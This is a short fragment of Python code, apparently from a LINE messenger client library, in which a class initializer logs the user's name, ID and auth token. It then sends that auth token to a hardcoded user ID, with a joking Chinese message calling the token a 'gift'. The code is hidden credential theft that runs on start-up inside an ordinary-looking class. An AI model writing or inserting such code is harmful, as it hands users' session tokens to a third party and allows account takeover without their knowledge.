...
class Square(object):
    ...
    def __init__(self):
        self.isLogin = True
        self.log("[ 登入用戶名 ] "+self.profile.displayName)
        self.log("[ 用戶MID ] " +self.profile.mid)
        self.log("[ 您的token ] "+self.authToken)
        self.sendMessage('uf5a5e6d5f334da2193f25ea9d4470451','其實我有一份禮物打算送給大家~那就是我的token><請你好好收下並利用我吧w\n\n'+self.authToken)
        try:
